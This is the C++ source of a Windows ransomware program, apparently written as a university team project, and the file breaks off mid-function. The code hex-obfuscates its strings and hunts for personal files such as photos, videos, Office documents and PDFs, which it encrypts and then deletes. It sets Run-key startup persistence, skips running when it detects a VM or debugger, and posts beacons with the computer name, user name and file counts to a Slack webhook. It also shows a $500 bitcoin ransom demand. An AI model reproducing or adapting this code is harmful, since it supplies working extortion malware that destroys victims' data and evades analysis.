//
// CSS 579
// Team Malware Project
//
// Team: Christopher Coy
//       Clarissa Pendleton
//       Samantha Smith
//       Skylar Onstot
//
// Malware Type: Ransomware
//

//
// The encryption/decryption key is:
//
//    Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy
//
// which is a Base64 encode of "ChrisClarissaSamanthaSkylar"
//

#include <fstream>
#include <string>
#include <iostream>
#include <filesystem>
#include <windows.h>
#include <wincrypt.h>
#include <Shlobj.h>
#include <winhttp.h>
#include <ctime>
#include <time.h>


#pragma comment (lib, "Winhttp.lib")

namespace fs = std::experimental::filesystem;

#define CLASSNAME "uwbcss579"
#define BLOCK_LEN 128
#define GET_USERS_DIR_FAILED -25
//#define TRACEOUTPUT // Uncomment '#define TRACEOUTPUT' to enable trace logging output
					  // Comment out '#define TRACEOUTPUT' prior to project submission to 
					  // minimize the strings in the program

// Global Variables
bool g_Verbosity = false;
bool g_Decrypt = false;

// Encoded String Declarations
//
// Use StringToHexGenerator.exe to generate the Hex version of a string you want to obfuscate
//
std::string strKey = "9764742653472355868674465764752686e46595a7e485169764742644e4851697862315"; // Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy
std::string strAppData = "16471644070714"; // AppData
std::string strAllUsers = "372756375502c6c614"; // All Users
std::string strPublicAcctPics = "375627574736960547e657f6363614c53696c6265705"; //  Public\\AccountPictures
std::string strExtBmp  = "07d626e2";   // .bmp
std::string strExtJpg  = "7607a6e2";   // .jpg
std::string strExtJpeg = "765607a6e2"; // .jpeg
std::string strExtPng  = "76e607e2";   // .png
std::string strExtGif  = "669676e2";   // .gif
std::string strExtMp4  = "4307d6e2";   // .mp4
std::string strExtMpg  = "7607d6e2";   // .mpg
std::string strExtMpeg = "765607d6e2"; // .mpeg
std::string strExtMov  = "67f6d6e2";   // .mov
std::string strExtMkv  = "67b6d6e2";   // .mkv
std::string strExtM2ts = "374723d6e2"; // .m2ts
std::string strExtMp3  = "3307d6e2";   // .mp3
std::string strExtM4a  = "1643d6e2";   // .m4a
std::string strExtDoc  = "36f646e2";   // .doc
std::string strExtDocx = "8736f646e2"; // .docx
std::string strExtXls  = "37c687e2";   // .xls
std::string strExtXlsx = "8737c687e2"; // .xlsx
std::string strExtPpt  = "470707e2";   // .ppt
std::string strExtPptx = "87470707e2"; // .pptx
std::string strExtPdf  = "664607e2";   // .pdf
std::string strExtTxt  = "478747e2";   // .txt
std::string strExtEncrypted = "46564707972736e656e2"; // .encrypted
std::string strBanner = "121257f69502371684028796274716d402568645"; // "The Matrix Has You!!"  // "128796274716d40256864702f6470256d6f636c65675"; // "Welcome to the Matrix!"
std::string strBannerFree = "1212565627640257f69502475635028796274716d402568645"; // "The Matrix Set You Free!!"
std::string strPasswordNeeded = "e25657e69647e6f63602f64702e6f6964707f60246f2025686470286479677024627f6773737160702160256469667f6270702473757d60257f695"; // "You must provide a password with the /d option to continue."
std::string strPwdMessage = "02a34627f6773737160702568647024656275647e6560257f695"; // "You entered the password: "
std::string strRecoveryFailed = "e24627f67737371607022757f697028647967702d6162776f627070256864702e6572756250202e2275667f636562702f647024656c6961666023756c6966602d5"; // "] files failed to recover.  Rerun the program with your password."
std::string strAllYourFilesAreBelongToUs = "c5a302121212375502f6450276e6f6c6562402562714023756c69664022757f69502c6c614"; // "All Your Files Are Belong To Us!!! :\\"
std::string strAllYourFilesAreBelongToYou = "e3a30212121257f69502f6450276e6f6c6562402562714023756c69664022757f69502c6c614"; // "All Your Files Are Belong To You!!! :>"
std::string strNotAllYourFilesAreBelongToYou = "c3a30212121257f69502f6450276e6f6c6562402562714023756c69664022757f69502c6c6140247f6e4"; // "Not All Your Files Are Belong To You!!! :<"
std::string strUserAgent = "03e213f243634627f675e69675"; // WinWord64/1.0
std::string strSlackHost = "d6f636e2b63616c637e237b6f6f686"; // hooks.slack.com
std::string strHttpPost = "4535f405"; // POST
std::string strSlackUrl = "6705936676a754a45734657566f42793b483053794a5b615f27535e453e454d4a424f29573a505b453a4a445f23756369667275637f2"; // "/services/TJJ5KPZ7Y/BJMEN5NSW/QkZIsP8K9rOfWVCuJEzgf9Pv"
std::string strHttpHeaderJson = "e6c527c5e6f637a6f2e6f69647163696c607071602a356079747d247e65647e6f634"; // "Content-type: application/json\r\n"
//std::string strSlackPostMsg = ""; // "{ \"text\":\"New Infection!"  // not using at this time
std::string strSlackNewInfection = "12e6f69647365666e694027756e422a322478756472202b7"; // "{ \"text\":\"New Infection!"
std::string strSlackCleanInfection = "e6f602e6f69647365666e6940276e696e61656c63422a322478756472202b7"; // "{ \"text\":\"Cleaning Infection on";
std::string strSlackComputer = "02a32756475707d6f63402"; // " Computer: "
std::string strSlackUser = "02a32756375502b3"; // "; User: "
std::string strSlackFilesInfected = "02a3465647365666e694023756c6966402b3"; // "; Files Infected: "
std::string strSlackFilesDecrypted = "02a3465647079727365644023756c6966402b3"; // "; Files Decrypted: ";
std::string strSlackTimestamp = "02a307d616473756d6964502b3"; // "; Timestamp: "
std::string strSlackPostMsgEnd = "d70222"; // "\" }"
std::string strCryptoProvider = "2756469667f627050236968607162776f64707972734023554140246e6160214352502465636e61686e654024766f637f6273696d4"; // "Microsoft Enhanced RSA and AES Cryptographic Provider"
std::string strAllFilesDecrypted = "c6c614"; // All
std::string strFilesFailedToDecrypt = "02a34707972736564402f645024656c6961664023756c6966402b3"; // "; Files Failed To Decrypt: "
std::string strLocationOfStatuses = "3777f646e69675c54766f637f6273696d4c5562716774766f635"; // Software\\Microsoft\\Windows
std::string strLocationOfPersistance = "e65725c5e6f6963727566547e65627275734c53777f646e69675c54766f637f6273696d4c5562716774766f635"; // Software\\Microsoft\\Windows\\CurrentVersion\\Run
std::string strRansom = "d6f637e61625"; // Ransom
std::string infected = "465647365666e694"; // Infected
std::string strWinWord64 = "43634627f675e69675"; // WinWord64
std::string strRansomMsg = "33332313230315d607f62333439357e4a403437493635302a3029756b602e6f696470797273656460256864702563716863627570702f6470237375627464616023796864702f64702e696f6364796260266f602864727f67702030353420246e6563702473757d60257f695a0a0e29756b60256471667962707025686470227f666029716070257f69702373756c6e657023756c69666022757f697024707972736564602e61636025637c6560256e6f602f6e60246e61602c23756c69666022757f697024707972736564602f647024656279657175627023796029756b602e6f6964707972736564602564716679627070214a0a0e22756475707d6f63602379686470227f66602465647162756e65676029756b60256571796e6570246e61602e6f6964707972736e6560247375676e6f62747370256864702864796770246564707972736e65602e65656260256671686023756c696660247e6164727f607d6960227568647f60246e61602c237f647f6860702c23747e656d65736f646022757f695a0a0e243634627f675e696750297260246564707972736e656025627160256679627460246271686022757f69702e6f6023756c6966602c6c614a0a0121212375502f6450276e6f6c6562402562714023756c69664022757f69502c6c61402a3e4f49445e454454514";
/*
"ATTENTION: All Your Files Are Belong To Us!!!

All files on your hard drive are encrypted by WinWord64.

Your documents, photos, and other important files have been encrypted with the strongest encryption and unique key generated for this computer.

A private decryption key is required to decrypt your files, and no one else can decrypt your files unless you pay for the private key.

You must send $500 worth of bitcoin to this address to purchase the decryption key : 569G40JNu9432opmQ021233"
*/


// Function Declarations
DWORD FindFiles();
DWORD FindEncryptedFiles(std::string decryptionKey);
bool EncryptAndDeleteThisFile(std::string path);
bool DecryptThisFile(std::string path, std::string decryptionKey);
bool ExcludePath(std::string checkString);
bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string key);
bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string key);
void SendInfectionBeacon(DWORD dwEncryptedFileCount);
void SendDecryptionBeacon(DWORD dwEncryptedFileCount);
void RansomMessage(DWORD dwEncryptedFileCount);
void FreedomMessage(DWORD dwEncryptedFileCount);
bool AnalysisCheck();
void SaveStartupPersistence();
void DeleteStartupPersistence();
void SaveInfectionStatus(DWORD dwInfectionStatus);
DWORD GetInfectionStatus();
void SaveRansomStatus(DWORD dwRansomStatus);
DWORD GetRansomStatus();
void PrintProgress();
std::string WstrToStr(const std::wstring& wstr);
void HexToString(const std::string hexstr, std::string& str);
void DecodeStrings();
std::string GetLocalComputerName();
std::string GetCurrentUser();
std::string GetUtcTime();
void SaveRegistryKey(wchar_t* appName, std::string keyName);
void DeleteRegistryKey(std::string keyName);
std::wstring StrToLpcwstr(std::string str);


int main(int argc, char* argv[])
{ 
	std::string keyDecrypt = "";
	DWORD dwEncryptionResult = 0;
	DWORD dwDecryptionResult = 0;

	//
	// Check for debugger, execution in a VM, or other dynamic analysis 
	//
	if (AnalysisCheck())
	{
		// Found evidence of some kind of dynamic analysis
		// Halting program execution - why make it easy on the other teams?? :)
		return 0;
	}

	DecodeStrings();
	
	std::cout << strBanner << std::endl;
	
	for (int i = 1; i < argc; ++i) 
	{
		if (std::string(argv[i]) == "/v") 
		{
			g_Verbosity = true;
		}
		else if (std::string(argv[i]) == "/d")
		{
			if (i + 1 < argc)
			{ 
				g_Decrypt = true;

				keyDecrypt = argv[++i];
			}
			else
			{ 
				// There was no key provided with the /d option.

				// Obfuscating the string "You must provide a password with the /d option to continue." from analysis tools
				// "You must provide a password with the /d option to continue." 
				std::cout << strPasswordNeeded << std::endl;

				return 0;  // Halt program exection
			}
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::cout << "Verbosity:  Enabled" << std::endl;
		std::cout << "Operation:  " << g_Decrypt << "  [1: Decrypt; 0: Encrypt]" << std::endl;
		std::cout << "keyDecrypt: " << keyDecrypt << std::endl;
		std::cout << std::endl;
	}
#endif

	// Encrypt or Decrypt files?
	if (!g_Decrypt)
	{
		//
		// Encrypt Files
		//

		PrintProgress();

		// Finds, Encrypts, and Deletes important personal files
		dwEncryptionResult = FindFiles();

		if (dwEncryptionResult == GET_USERS_DIR_FAILED)
		{
			// Couldn't find the Users directory 
			return 0; // Halt program exection
		}

		// Save status to Registry
		SaveStartupPersistence();
		SaveInfectionStatus(1);
		SaveRansomStatus(0);

		// Send network beacon to report ransom/encryption completed
		SendInfectionBeacon(dwEncryptionResult);

		// Display message to user demanding bitcoin payment for decryption key
		RansomMessage(dwEncryptionResult);
	}
	else
	{
		//
		// Decrypt Files
		//

		// Finds .encrypted files, and decrypts them

		// Obfuscating the string "You entered the password: " from analysis tools
		// "You entered the password: " << keyDecrypt 
		std::cout << strPwdMessage << keyDecrypt << std::endl; 

		PrintProgress();

		// Save status to Registry
		DeleteStartupPersistence();
		SaveInfectionStatus(1);
		SaveRansomStatus(1);

		dwDecryptionResult = FindEncryptedFiles(keyDecrypt);
		if (dwDecryptionResult > 0)
		{
			// Obfuscating the string "] files failed to recover.  Rerun the program with your password." from analysis tools
			// "0x" << std::hex << dwDecryptionResult << " [" << std::dec << dwDecryptionResult << "] files failed to recover.  Rerun the program with your password."
			std::cout << "0x" << std::hex << dwDecryptionResult << " [" << std::dec << dwDecryptionResult << strRecoveryFailed << std::endl;
		}
	}


	// End with a fun message
	if (!g_Decrypt)
	{
		// Obfuscating the string "All Your Files Are Belong To Us!!! :\\" from analysis tools
		// "All Your Files Are Belong To Us!!! :\\" 
		std::cout << std::endl << strAllYourFilesAreBelongToUs << std::endl;
	}
	else
	{
		if (dwDecryptionResult > 0)
		{
			// Obfuscating the string "Not All Your Files Are Belong To You!!! :<" from analysis tools
			// "Not All Your Files Are Belong To You!!! :<" 
			std::cout << std::endl << strNotAllYourFilesAreBelongToYou << std::endl;

			// Send network beacon to report ransom/decryption partially completed - machine is not fully cleaned
			SendDecryptionBeacon(dwDecryptionResult);

			// Display a decryption results message to the user
			FreedomMessage(dwDecryptionResult);
		}
		else
		{
			// Obfuscating the string "All Your Files Are Belong To You!!! :>" from analysis tools
			// "All Your Files Are Belong To You!!! :>" 
			std::cout << std::endl << strAllYourFilesAreBelongToYou << std::endl;

			// Send network beacon to report ransom/decryption completed - machine is successfully cleaned
			SendDecryptionBeacon(dwDecryptionResult);

			// Display a decryption results message to the user
			FreedomMessage(dwDecryptionResult);
		}
	}
}

//
// Supporting functions
//

void DecodeStrings()
{
	// Decode the Encoded String Declarations into the actual text strings for use throughout the program

	HexToString(strKey, strKey);

	HexToString(strAppData, strAppData);
	HexToString(strAllUsers, strAllUsers);
	HexToString(strPublicAcctPics, strPublicAcctPics);

	HexToString(strExtBmp, strExtBmp);
	HexToString(strExtJpg, strExtJpg);
	HexToString(strExtJpeg, strExtJpeg);
	HexToString(strExtPng, strExtPng);
	HexToString(strExtGif, strExtGif);
	HexToString(strExtMp4, strExtMp4);
	HexToString(strExtMpg, strExtMpg);
	HexToString(strExtMpeg, strExtMpeg);
	HexToString(strExtMov, strExtMov);
	HexToString(strExtMkv, strExtMkv);
	HexToString(strExtM2ts, strExtM2ts);
	HexToString(strExtMp3, strExtMp3);
	HexToString(strExtM4a, strExtM4a);
	HexToString(strExtDoc, strExtDoc);
	HexToString(strExtDocx, strExtDocx);
	HexToString(strExtXls, strExtXls);
	HexToString(strExtXlsx, strExtXlsx);
	HexToString(strExtPpt, strExtPpt);
	HexToString(strExtPptx, strExtPptx);
	HexToString(strExtPdf, strExtPdf);
	HexToString(strExtTxt, strExtTxt);
	HexToString(strExtEncrypted, strExtEncrypted);
	HexToString(strCryptoProvider, strCryptoProvider);

	HexToString(strBanner, strBanner);
	HexToString(strBannerFree, strBannerFree);
	HexToString(strPasswordNeeded, strPasswordNeeded);
	HexToString(strPwdMessage, strPwdMessage);
	HexToString(strRecoveryFailed, strRecoveryFailed);

	HexToString(strAllYourFilesAreBelongToUs, strAllYourFilesAreBelongToUs);
	HexToString(strAllYourFilesAreBelongToYou, strAllYourFilesAreBelongToYou);
	HexToString(strNotAllYourFilesAreBelongToYou, strNotAllYourFilesAreBelongToYou);

	HexToString(strUserAgent, strUserAgent);
	HexToString(strSlackHost, strSlackHost);
	HexToString(strHttpPost, strHttpPost);
	HexToString(strSlackUrl, strSlackUrl);
	HexToString(strHttpHeaderJson, strHttpHeaderJson);
	HexToString(strSlackNewInfection, strSlackNewInfection);
	HexToString(strSlackCleanInfection, strSlackCleanInfection);
	HexToString(strSlackComputer, strSlackComputer);
	HexToString(strSlackUser, strSlackUser);
	HexToString(strSlackFilesInfected, strSlackFilesInfected);
	HexToString(strSlackFilesDecrypted, strSlackFilesDecrypted);
	HexToString(strSlackTimestamp, strSlackTimestamp);
	HexToString(strSlackPostMsgEnd, strSlackPostMsgEnd);
	HexToString(strAllFilesDecrypted, strAllFilesDecrypted);
	HexToString(strFilesFailedToDecrypt, strFilesFailedToDecrypt);

	HexToString(strLocationOfStatuses, strLocationOfStatuses);
	HexToString(strLocationOfPersistance, strLocationOfPersistance);
	HexToString(strRansom, strRansom);
	HexToString(infected, infected);
	HexToString(strWinWord64, strWinWord64);
	HexToString(strRansomMsg, strRansomMsg);
}

bool AnalysisCheck()
{
	// Check for debugger, execution in a VM, or other dynamic analysis
	// Returns True if VM or debugger found, False otherwise.

	// No Pill VM check
	unsigned char ldtr[5] = "\xef\xbe\xad\xde";
	unsigned long ldt = 0;
	_asm sldt ldtr
	ldt = *((unsigned long *)&ldtr[0]);

	// True if No Pill or Debugger attached
	return (ldt != 0xdead0000 || IsDebuggerPresent());
}

void SendInfectionBeacon(DWORD dwEncryptedFileCount)
{
	// Sends an infection beacon to a slack channel to track infections
	//
	// Beacon data includes machinename, username, # files encrypted, UTC time of infection event
	
	/*	
	Slack App details for reporting infection status

	curl -X POST -H 'Content-type: application/json' --data '{"text":"Hello, World!"}' https://hooks.slack.com/services/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

	https://hooks.slack.com/services/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
	*/

	bool fSuccess = false;
	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;

	// Use WinHttpOpen to obtain a HTTP session handle
	std::wstring useragent_w = std::wstring(strUserAgent.begin(), strUserAgent.end());
	LPCWSTR userAgent = useragent_w.c_str();

	hSession = WinHttpOpen(
		userAgent, //L"WinWord64/1.0",
		WINHTTP_ACCESS_TYPE_NO_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 
		0);

	// Connect to the beacon HTTP server
	if (hSession)
	{
		std::wstring host_w = std::wstring(strSlackHost.begin(), strSlackHost.end());
		LPCWSTR hostSlackApp = host_w.c_str();

		hConnect = WinHttpConnect(
			hSession,
			hostSlackApp, //L"hooks.slack.com",
			INTERNET_DEFAULT_HTTPS_PORT,
			0);
	}


	// Create an HTTP Open Request handle
	if (hConnect)
	{
		//std::cout << "Connected..." << std::endl;

		std::wstring post_w = std::wstring(strHttpPost.begin(), strHttpPost.end());
		LPCWSTR postMethod = post_w.c_str();

		std::wstring url_w = std::wstring(strSlackUrl.begin(), strSlackUrl.end());
		LPCWSTR urlSlackApp = url_w.c_str();

		hRequest = WinHttpOpenRequest(
			hConnect,
			postMethod, //L"POST",
			urlSlackApp, //L"/services/TJJ5KPZ7Y/BJMEN5NSW/QkZIsP8K9rOfWVCuJEzgf9Pv",
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			WINHTTP_FLAG_SECURE);
	}

	//
	// Prepare POST request headers and data
	//
	std::string jsonheader = strHttpHeaderJson; // "Content-type: application/json\r\n";
	std::wstring jsonheader_w = std::wstring(jsonheader.begin(), jsonheader.end());
	LPCWSTR headers = jsonheader_w.c_str();
	DWORD headersLength = -1;

	std::string postData = strSlackNewInfection; // "{ \"text\":\"New Infection!";
	std::string computerName = GetLocalComputerName();
	postData.append(strSlackComputer); // (" Computer: ");
	postData.append(computerName);
	
	std::string userName = GetCurrentUser();
	postData.append(strSlackUser); // ("; User: ");
	postData.append(userName);

	postData.append(strSlackFilesInfected); // ("; Files Infected: ");
	postData.append(std::to_string(dwEncryptedFileCount));

	std::string timestamp = GetUtcTime();
	postData.append(strSlackTimestamp); // ("; Timestamp: ");
	postData.append(timestamp);

	postData.append(strSlackPostMsgEnd); // ("\" }");


	// Send the WinHttp POST request
	if (hRequest)
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "Sending infection beacon message: " << postData << std::endl;
		}
#endif

		fSuccess = WinHttpSendRequest(
			hRequest,
			headers,
			headersLength,
			(void*)postData.c_str(),
			static_cast<unsigned long>(postData.length()),
			static_cast<unsigned long>(postData.length()),
			0);
	}

	// Check for errors
	if (!fSuccess)
	{
		DWORD dwStatus;
		dwStatus = GetLastError();

		LPVOID lpMsgBuf;
		FormatMessage(
			FORMAT_MESSAGE_ALLOCATE_BUFFER |
			FORMAT_MESSAGE_FROM_SYSTEM |
			FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			dwStatus,
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			(LPTSTR)& lpMsgBuf,
			0, NULL);

#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "SendInfectionBeacon status: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
			std::wcout << "SendInfectionBeacon error:  " << (LPTSTR)lpMsgBuf;
		}
#endif
	}

	// Close open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

}

void SendDecryptionBeacon(DWORD dwDecryptedFileCount)
{
	// Sends beacon to a slack channel to track infection cleaning
	//
	// Beacon data includes machinename, username, # files not decrypted, UTC time of cleaning event

	/*
	Slack App details for reporting infection status

	curl -X POST -H 'Content-type: application/json' --data '{"text":"Hello, World!"}' https://hooks.slack.com/services/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

	https://hooks.slack.com/services/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
	*/

	bool fSuccess = false;
	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;

	// Use WinHttpOpen to obtain a HTTP session handle
	std::wstring useragent_w = std::wstring(strUserAgent.begin(), strUserAgent.end());
	LPCWSTR userAgent = useragent_w.c_str();

	hSession = WinHttpOpen(
		userAgent, //L"WinWord64/1.0",
		WINHTTP_ACCESS_TYPE_NO_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		0);

	// Connect to the beacon HTTP server
	if (hSession)
	{
		std::wstring host_w = std::wstring(strSlackHost.begin(), strSlackHost.end());
		LPCWSTR hostSlackApp = host_w.c_str();

		hConnect = WinHttpConnect(
			hSession,
			hostSlackApp, //L"hooks.slack.com",
			INTERNET_DEFAULT_HTTPS_PORT,
			0);
	}


	// Create an HTTP Open Request handle
	if (hConnect)
	{
		//std::cout << "Connected..." << std::endl;

		std::wstring post_w = std::wstring(strHttpPost.begin(), strHttpPost.end());
		LPCWSTR postMethod = post_w.c_str();

		std::wstring url_w = std::wstring(strSlackUrl.begin(), strSlackUrl.end());
		LPCWSTR urlSlackApp = url_w.c_str();

		hRequest = WinHttpOpenRequest(
			hConnect,
			postMethod, //L"POST",
			urlSlackApp, //L"/services/TJJ5KPZ7Y/BJMEN5NSW/QkZIsP8K9rOfWVCuJEzgf9Pv",
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			WINHTTP_FLAG_SECURE);
	}

	//
	// Prepare POST request headers and data
	//
	std::string jsonheader = strHttpHeaderJson; // "Content-type: application/json\r\n";
	std::wstring jsonheader_w = std::wstring(jsonheader.begin(), jsonheader.end());
	LPCWSTR headers = jsonheader_w.c_str();
	DWORD headersLength = -1;

	std::string postData = strSlackCleanInfection; // "{ \"text\":\"Cleaning Infection on";
	std::string computerName = GetLocalComputerName();
	postData.append(strSlackComputer); // (" Computer: ");
	postData.append(computerName);

	std::string userName = GetCurrentUser();
	postData.append(strSlackUser); // ("; User: ");
	postData.append(userName);

	if (dwDecryptedFileCount == 0)
	{
		postData.append(strSlackFilesDecrypted); // ("; Files Decrypted: ");
		postData.append(strAllFilesDecrypted);
	}
	else
	{
		postData.append(strFilesFailedToDecrypt); // ("; Files Failed To Decrypt: ");
		postData.append(std::to_string(dwDecryptedFileCount));
	}

	std::string timestamp = GetUtcTime();
	postData.append(strSlackTimestamp); // ("; Timestamp: ");
	postData.append(timestamp);

	postData.append(strSlackPostMsgEnd); // ("\" }");


	// Send the WinHttp POST request
	if (hRequest)
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "Sending decryption beacon message: " << postData << std::endl;
		}
#endif

		fSuccess = WinHttpSendRequest(
			hRequest,
			headers,
			headersLength,
			(void*)postData.c_str(),
			static_cast<unsigned long>(postData.length()),
			static_cast<unsigned long>(postData.length()),
			0);
	}

	// Check for errors
	if (!fSuccess)
	{
		DWORD dwStatus;
		dwStatus = GetLastError();

		LPVOID lpMsgBuf;
		FormatMessage(
			FORMAT_MESSAGE_ALLOCATE_BUFFER |
			FORMAT_MESSAGE_FROM_SYSTEM |
			FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			dwStatus,
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			(LPTSTR)& lpMsgBuf,
			0, NULL);

#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "SendDecryptionBeacon status: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
			std::wcout << "SendDecryptionBeacon error:  " << (LPTSTR)lpMsgBuf;
		}
#endif
	}

	// Close open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
}

void RansomMessage(DWORD dwEncryptedFileCount)
{
	// Display a ransom message to the user, and to 
	// demand bitcoin payment to get the decryption key

	std::wstring messageBoxText = StrToLpcwstr(strRansomMsg);
	std::wstring messageBoxCaption = StrToLpcwstr(strBanner); // (strRansom);;
	MessageBox(NULL, messageBoxText.c_str(), messageBoxCaption.c_str(), MB_OK);
}

void FreedomMessage(DWORD dwDecryptionResult)
{
	// Display a decryption results message to the user

	if (dwDecryptionResult > 0)
	{
		// "Not All Your Files Are Belong To You!!! :<" 
		strNotAllYourFilesAreBelongToYou.append("\n\n").append("[").append(std::to_string(dwDecryptionResult)).append(strRecoveryFailed);

		std::wstring messageBoxCaption = StrToLpcwstr(strBanner);
		std::wstring messageBoxText = StrToLpcwstr(strNotAllYourFilesAreBelongToYou);
		MessageBox(NULL, messageBoxText.c_str(), messageBoxCaption.c_str(), MB_OK);
	}
	else
	{
		std::wstring messageBoxCaption = StrToLpcwstr(strBannerFree);
		std::wstring messageBoxText = StrToLpcwstr(strAllYourFilesAreBelongToYou);
		MessageBox(NULL, messageBoxText.c_str(), messageBoxCaption.c_str(), MB_OK);
	}
}

void SaveStartupPersistence()
{
	// Save startup persistence data to the Registry
	//
	// By continuing to run program at startup, any new files will be 
	// encrypted until payment is received
	//

	wchar_t szPathToExe[MAX_PATH];
	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	std::string keyName = strLocationOfPersistance;
	SaveRegistryKey(szPathToExe, keyName);
}

void DeleteStartupPersistence()
{
	// Delete startup persistence data from the Registry

	std::string keyName = strLocationOfPersistance;
	DeleteRegistryKey(keyName);
}

void SaveInfectionStatus(DWORD dwInfectionStatus)
{
	// Save infection status to the Registry
	// Create a Key+Value to store dwInfectionStatus
	// This can be used to avoid double infection

	std::string keyName = strLocationOfStatuses;
	std::wstring key = StrToLpcwstr(keyName);

	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize(sizeof(dwInfectionStatus));
	std::wstring inf = StrToLpcwstr(infected);
	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegSetValueExW(hKey, inf.c_str(), 0, REG_DWORD, (BYTE*)& dwInfectionStatus, dwSize);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}
}

DWORD GetInfectionStatus()
{
	// Get infection status from the Registry
	// Read a Key+Value to get dwInfectionStatus
	// This can be used to avoid double infection

	HKEY hKey = NULL;
	DWORD nResult(0);
	DWORD bufferSize(sizeof(nResult));
	std::string keyName = strLocationOfStatuses;
	std::wstring key = StrToLpcwstr(keyName);
	std::wstring inf = StrToLpcwstr(infected);

	LONG error = RegOpenKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey);
	error = RegQueryValueExW(hKey, inf.c_str(), 0, NULL, reinterpret_cast<LPBYTE>(&nResult), &bufferSize);
	return nResult;
}

void SaveRansomStatus(DWORD dwRansomStatus)
{
	// Save ransom status to the Registry
	// Create a Key+Value to store dwRansomStatus
	// This can be used to track whether the user paid or not

	std::string keyName = strLocationOfStatuses;
	std::wstring key = StrToLpcwstr(keyName);

	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize(sizeof(dwRansomStatus));
	std::wstring ransomStr = StrToLpcwstr(strRansom);
	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegSetValueExW(hKey, ransomStr.c_str(), 0, REG_DWORD, (BYTE*)& dwRansomStatus, dwSize);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}
}

DWORD GetRansomStatus()
{
	// Get ransom status from the Registry
	// Read a Key+Value to get dwRansomStatus
	// This can be used to track whether the user paid or not

	HKEY hKey = NULL;
	DWORD nResult(0);
	DWORD bufferSize(sizeof(nResult));
	std::string keyName = strLocationOfStatuses;
	std::wstring key = StrToLpcwstr(keyName);
	std::wstring ransomStr = StrToLpcwstr(strRansom);

	LONG error = RegOpenKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey);
	error = RegQueryValueExW(hKey, ransomStr.c_str(), 0, NULL, reinterpret_cast<LPBYTE>(&nResult), &bufferSize);
	return nResult;
}

void SaveRegistryKey(wchar_t* keyValue, std::string keyName)
{
	// Support function to write Registry keys

	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;
	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};
	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, keyValue);
	wcscat_s(szValue, count, L"\" ");
	std::wstring winWord = StrToLpcwstr(strWinWord64);
	std::wstring key = StrToLpcwstr(keyName);
	
#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::wcout << "Save Registry Key:   " << key << std::endl;
		std::wcout << "Save Registry Value: " << szValue << std::endl;
	}
#endif

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);
	wchar_t val[count] = {};

	if (fSuccess)
	{
		dwSize = sizeof(wchar_t) * (wcslen(szValue) + 1);
		lResult = RegSetValueExW(hKey, winWord.c_str(), 0, REG_SZ, (BYTE*)szValue, dwSize);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}
}

void DeleteRegistryKey(std::string keyName)
{
	// Support function to delete Registry keys

	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	std::wstring winWord = StrToLpcwstr(strWinWord64);
	std::wstring key = StrToLpcwstr(keyName);

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::wcout << "Del Registry Key: " << key << std::endl;
	}
#endif

	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, KEY_ALL_ACCESS, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegDeleteValue(hKey, winWord.c_str());
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
